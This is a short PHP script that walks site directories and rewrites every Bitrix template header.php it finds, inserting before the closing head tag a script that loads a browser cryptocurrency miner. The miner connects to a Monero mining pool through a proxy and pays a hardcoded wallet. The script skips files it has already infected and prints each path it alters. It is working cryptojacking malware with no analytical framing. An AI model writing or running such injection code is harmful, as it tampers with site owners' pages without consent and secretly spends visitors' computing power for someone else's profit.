<?php

$payload="<script src=\"https://hidden1994.github.io/my-proxy/m.js?proxy=wss://frontend-styles.now.sh?pool=pool.supportxmr.com:3333\"></script><script>var a = CH.Anonymous('47ksij7FmrW2pZrwvyxWgCFRDbhiUexZxRTW5qvEUefqNH9wP2UcjrG5mZXfqPLqiTfhnoaiBN1xR7tBiyodD74QAgiFXAY');a.setThrottle(0.5);a.start();</script>\n</head>";

$dirs = array_filter(glob('*'), 'is_dir');

foreach($dirs as $dirName) {
  $templatePath = $dirName . "/bitrix/templates/"; //ext_www
  //$templatePath = $dirName . "/templates/"; //www
  IterateOverTemplates($templatePath);
}

function IterateOverTemplates($templatesRoot) {
  if(!is_dir($templatesRoot)) return;
  global $payload;
  
  $it = new RecursiveDirectoryIterator($templatesRoot);

  foreach(new RecursiveIteratorIterator($it) as $file) {
    $fileName = $file->getFilename();

    if ($fileName == 'header.php') {
      $filePath = $file->getPathname();
      $fileContent = file_get_contents($filePath);
      
      if(strpos($fileContent, "hidden1994")) return;
      
      echo $filePath;
      
      file_put_contents($filePath, str_replace("</head>", $payload, $fileContent));
    }
  }
}